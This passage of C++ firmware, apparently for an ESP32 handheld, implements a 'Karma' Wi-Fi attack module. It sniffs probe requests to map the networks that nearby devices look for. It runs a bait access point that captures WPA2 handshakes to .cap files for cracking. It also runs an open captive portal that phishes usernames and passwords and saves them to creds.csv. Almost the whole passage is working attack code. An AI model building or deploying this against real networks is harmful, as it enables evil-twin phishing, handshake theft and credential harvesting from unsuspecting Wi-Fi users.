            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SSID "); dm.setTextColor(TFT_WHITE);
            char s[34]; snprintf(s, sizeof(s), "%.31s", ssid); dm.println(s);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("CH ");   dm.setTextColor(TFT_WHITE);
            char c[6]; snprintf(c, sizeof(c), "%u", channel); dm.println(c);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SD ");
            dm.setTextColor(fileOk ? TFT_GREEN : TFT_RED);
            dm.println(fileOk ? "saving .cap" : "none (RAM only)");
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            char st[44]; snprintf(st, sizeof(st), "EAPOL:%lu  Beacon:%lu",
                                  (unsigned long)s_hsEapol, (unsigned long)s_hsBeacons);
            dm.setTextColor(TFT_WHITE); dm.println(st);
            dm.setCursor(4, dm.getCursorY());
            if (s_hsGotM2) {
                char m[46]; snprintf(m, sizeof(m), "[M2] %02X:%02X:%02X:%02X:%02X:%02X",
                    s_hsSta[0], s_hsSta[1], s_hsSta[2], s_hsSta[3], s_hsSta[4], s_hsSta[5]);
                dm.setTextColor(TFT_GREEN); dm.println(m);
            } else {
                dm.setTextColor(0x4208); dm.println("Waiting for client...");
            }
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF);
            dm.println(s_hsGotM2 ? "[c] crack  [q] stop" : "[q] stop");
            lastDraw = now; redraw = false;
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if ((k == 'c' || k == 'C') && s_hsGotM2) { crackReq = true; break; }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    // teardown — stop capture + AP + promiscuous BEFORE any SD write (GDMA rule)
    s_hsCapturing = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    delay(50);

    int written = 0;
    if (fileOk) {
        int n = s_hsCount;
        for (int i = 0; i < n; i++) {
            pcap::writeRecord(cap, s_hs[i].data, s_hs[i].len, s_hs[i].ts);
            written++;
        }
        cap.flush(); cap.close();
    }

    // [c] → crack now (reads s_hs frames, so do it BEFORE freeing them)
    bool didCrack = false;
    if (crackReq && s_hsGotM2) { karmaCrack(ssid); didCrack = true; }

    heap_caps_free(s_hs); s_hs = nullptr;

    if (!didCrack) {
        dm.clearScreen();
        dm.setCursor(4, outputY);
        if (s_hsGotM2) { dm.setTextColor(TFT_GREEN);  dm.println("Handshake (M2) captured!"); }
        else           { dm.setTextColor(TFT_YELLOW); dm.println("No M2 captured."); }
        dm.setCursor(4, dm.getCursorY());
        char r[60];
        if (fileOk) snprintf(r, sizeof(r), "Saved %d frames to /apps/karma", written);
        else        snprintf(r, sizeof(r), "%d frames in RAM (no SD)", s_hsCount);
        dm.setTextColor(TFT_WHITE); dm.println(r);
    }

    if (interactive) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF); dm.println("[any key] back to list");
        while (!inputHandler.getKeyboardInput()) vTaskDelay(pdMS_TO_TICKS(20));
    } else {
        dm.printCommandScreen();
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// Phase 4 — open soft-AP + captive portal (credential capture)
// Thin wrapper over the shared CaptivePortal (wifi/core/captive_portal). Karma only
// adds the on-screen UI and persists captured creds to /apps/karma/creds.csv on
// exit — written AFTER CaptivePortal::end() drops the AP (GDMA-safe).
// ════════════════════════════════════════════════════════════════════════════════
static void karmaPortal(const char* ssid, bool interactive) {
    DisplayManager& dm = displayManager;
    char target[33]; strncpy(target, ssid, 32); target[32] = '\0';

    CaptivePortal* cp = new CaptivePortal();
    if (!cp) {
        dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
        dm.println("Karma: portal alloc failed");
        if (!interactive) dm.printCommandScreen();
        return;
    }

    // Pick the page (built-ins + SD .html) before the AP comes up (SD read is idle/safe).
    char tplLabel[24] = "Generic WiFi";
    CpChoice ch;
    if (cpPickTemplate(SD_DIR_KARMA_PORTAL, ch)) {
        if (ch.builtin >= 0) {
            cp->useBuiltin(ch.builtin);
            snprintf(tplLabel, sizeof(tplLabel), "%.23s", cpBuiltinName(ch.builtin));
        } else if (cp->loadTemplate(ch.sdPath)) {
            const char* base = strrchr(ch.sdPath, '/'); base = base ? base + 1 : ch.sdPath;
            snprintf(tplLabel, sizeof(tplLabel), "%.23s", base);
        }
    } else {                                  // user cancelled the picker → abort cleanly
        delete cp;
        if (!interactive) dm.printCommandScreen();
        return;
    }
    cp->begin(target, /*open=*/true);

    uint32_t lastDraw = 0;
    bool redraw = true;
    while (true) {
        cp->poll();
        if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;
        uint32_t now = millis();
        if ((redraw || now - lastDraw > 500) && !dm.isBlocked()) {
            drawHeader("PORT", 0, 0);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SSID "); dm.setTextColor(TFT_WHITE);
            char s[34]; snprintf(s, sizeof(s), "%.31s", target); dm.println(s);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("Clients "); dm.setTextColor(TFT_WHITE);
            char c[6]; snprintf(c, sizeof(c), "%d", cp->clients()); dm.println(c);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SD ");
            dm.setTextColor(sdCardManager.canAccessSD() ? TFT_GREEN : TFT_RED);
            dm.println(sdCardManager.canAccessSD() ? "creds.csv on exit" : "none (RAM only)");
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("Page "); dm.setTextColor(TFT_WHITE);
            dm.println(tplLabel);
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            char cap[40]; snprintf(cap, sizeof(cap), "Captured: %d", cp->credCount());
            dm.setTextColor(cp->credCount() ? TFT_GREEN : 0x4208); dm.println(cap);
            if (cp->credCount()) {
                dm.setCursor(4, dm.getCursorY());
                dm.setTextColor(TFT_WHITE);
                char l[48]; snprintf(l, sizeof(l), "%.20s / %.16s", cp->lastUser(), cp->lastPass());
                dm.println(l);
            }
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.println("[q] stop");
            lastDraw = now; redraw = false;
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    cp->end();   // AP down → SD writes now GDMA-safe

    int saved = 0, total = cp->storedCount();
    if (sdCardManager.canAccessSD() && total > 0) {
        sdCardManager.ensureDir(SD_DIR_KARMA);
        bool isNew = !SD.exists(SD_DIR_KARMA "/creds.csv");
        File f = SD.open(SD_DIR_KARMA "/creds.csv", FILE_APPEND);
        if (f) {
            if (isNew) f.println("ssid,user,pass");
            const CpCred* cr = cp->creds();
            for (int i = 0; i < total; i++) f.printf("%s,%s,%s\n", target, cr[i].user, cr[i].pass);
            f.close();
            saved = total;
        }
    }
    int credCount = cp->credCount();
    delete cp;

    dm.clearScreen();
    dm.setCursor(4, outputY);
    if (credCount) { dm.setTextColor(TFT_GREEN);  dm.println("Credentials captured!"); }
    else           { dm.setTextColor(TFT_YELLOW); dm.println("No credentials captured."); }
    dm.setCursor(4, dm.getCursorY());
    char r[60];
    if (saved) snprintf(r, sizeof(r), "Saved %d to /apps/karma/creds.csv", saved);
    else       snprintf(r, sizeof(r), "%d captured (no SD)", credCount);
    dm.setTextColor(TFT_WHITE); dm.println(r);

    if (interactive) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF); dm.println("[any key] back to list");
        while (!inputHandler.getKeyboardInput()) vTaskDelay(pdMS_TO_TICKS(20));
    } else {
        dm.printCommandScreen();
    }
}

// ── entry point ─────────────────────────────────────────────────────────────────
void runKarma(char* args) {
    // ── subcommand: km hs <ssid> [ch]  → WPA2 handshake bait ──
    if (args && *args) {
        char a[96]; strncpy(a, args, sizeof(a) - 1); a[sizeof(a) - 1] = '\0';
        char* tok = strtok(a, " ");
        if (tok && strcasecmp(tok, "hs") == 0) {
            char* ss = strtok(nullptr, " ");
            char* ch = strtok(nullptr, " ");
            if (!ss || !*ss) {
                displayManager.clearScreen();
                displayManager.setCursor(4, outputY);
                displayManager.setTextColor(TFT_YELLOW);
                displayManager.println("Usage: km hs <ssid> [ch 1-13]");
                displayManager.printCommandScreen();
                return;
            }
            int c = ch ? atoi(ch) : 1; if (c < 1 || c > 13) c = 1;
            karmaHandshake(ss, (uint8_t)c, false);
            return;
        }
        if (tok && (strcasecmp(tok, "portal") == 0 || strcasecmp(tok, "p") == 0)) {
            char* ss = strtok(nullptr, "");        // rest of line = SSID (allows spaces)
            while (ss && *ss == ' ') ss++;
            if (!ss || !*ss) {
                displayManager.clearScreen();
                displayManager.setCursor(4, outputY);
                displayManager.setTextColor(TFT_YELLOW);
                displayManager.println("Usage: km portal <ssid>");
                displayManager.printCommandScreen();
                return;
            }
            karmaPortal(ss, false);
            return;
        }
        // any other arg → fall through to harvest
    }

    if (!ensureBuffers()) {
        freeBuffers();
        displayManager.clearScreen();
        displayManager.setCursor(4, outputY);
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Karma: PSRAM alloc failed");
        displayManager.printCommandScreen();
        return;
    }

    // promiscuous probe sniff — MGMT only, channel hop 1..13
    harvestStart();
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    int  view = VIEW_NETS;
    int  netPage = 0, netSel = 0, devPage = 0, devSel = 0;
    uint32_t lastDraw = 0, lastHop = 0, lastFp = 0;
    const uint32_t DRAW_MS = 400, HOP_MS = 250, FP_MS = 1500;
    const uint8_t  BAIT_CH = 6;   // bait AP channel (clients scan all → any works)
    bool redraw = true;

    while (true) {
        uint32_t now = millis();

        if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;

        if (now - lastHop > HOP_MS) {
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            lastHop = now;
        }

        drainRing();

        // refresh the fingerprint clustering only while the Devices view is up
        if (view == VIEW_DEVS && now - lastFp > FP_MS) {
            rebuildDevices();
            lastFp = now;
            redraw = true;
        }

        if (redraw || now - lastDraw > DRAW_MS) {
            if (view == VIEW_NETS) drawNets(ch, netPage, netSel);
            else                   drawDevices(devPage, devSel);
            lastDraw = now;
            redraw = false;
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        if (k == 'v' || k == 'V') {
            view = (view == VIEW_NETS) ? VIEW_DEVS : VIEW_NETS;
            if (view == VIEW_DEVS) { rebuildDevices(); lastFp = now; }
            redraw = true;
        }
        if (k == 'c' || k == 'C') {
            s_recCount = s_netCount = s_macCount = s_devCount = 0;
            s_totalProbes = 0; netPage = netSel = devPage = devSel = 0; redraw = true;
        }

        // ── [h] handshake / [p] portal → bait the selected target, then resume ──
        if (k == 'h' || k == 'H' || k == 'p' || k == 'P') {
            char target[33]; target[0] = '\0';
            if (view == VIEW_NETS && s_netCount > 0) {
                int order[KM_NET_MAX]; buildOrder(order, s_netCount);
                int si = netSel < s_netCount ? netSel : s_netCount - 1;
                strncpy(target, s_nets[order[si]].ssid, 32); target[32] = '\0';
            } else if (view == VIEW_DEVS && s_devCount > 0) {
                int order[KM_DEV_MAX]; buildDevOrder(order, s_devCount);
                int si = devSel < s_devCount ? devSel : s_devCount - 1;
                const KmDevice& d = s_devs[order[si]];
                if (d.pnlCount > 0 && d.pnl[0] < (uint16_t)s_netCount)
                    { strncpy(target, s_nets[d.pnl[0]].ssid, 32); target[32] = '\0'; }
            }
            if (target[0]) {
                bool wantHs = (k == 'h' || k == 'H');
                harvestStop();
                if (wantHs) karmaHandshake(target, BAIT_CH, true);
                else        karmaPortal(target, true);
                harvestStart();
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                lastHop = now = millis();
                redraw = true;
            }
        }

        TrackballEvent tb = inputHandler.getTrackballEvent();

        if (view == VIEW_NETS) {
            int n = s_netCount;
            if (tb == TBALL_DOWN && netSel < n - 1) { netSel++; netPage = netSel / KM_RPP; redraw = true; }
            if (tb == TBALL_UP   && netSel > 0)     { netSel--; netPage = netSel / KM_RPP; redraw = true; }
            int totalPages = n ? (n + KM_RPP - 1) / KM_RPP : 1;
            if ((k == 'l' || k == 'L') && netPage < totalPages - 1) { netPage++; netSel = netPage * KM_RPP; redraw = true; }
            if ((k == 'a' || k == 'A') && netPage > 0)              { netPage--; netSel = netPage * KM_RPP; redraw = true; }
        } else {
            int n = s_devCount;
            int totalPages = n ? (n + KM_DEV_RPP - 1) / KM_DEV_RPP : 1;
            if (tb == TBALL_DOWN && devSel < n - 1) { devSel++; devPage = devSel / KM_DEV_RPP; redraw = true; }
            if (tb == TBALL_UP   && devSel > 0)     { devSel--; devPage = devSel / KM_DEV_RPP; redraw = true; }
            if ((k == 'l' || k == 'L') && devPage < totalPages - 1) { devPage++; devSel = devPage * KM_DEV_RPP; redraw = true; }
            if ((k == 'a' || k == 'A') && devPage > 0)              { devPage--; devSel = devPage * KM_DEV_RPP; redraw = true; }
        }

        if (!k && tb == TBALL_NONE) vTaskDelay(pdMS_TO_TICKS(10));
    }

    harvestStop();
    WiFi.mode(WIFI_STA);

    freeBuffers();
    displayManager.printCommandScreen();
}
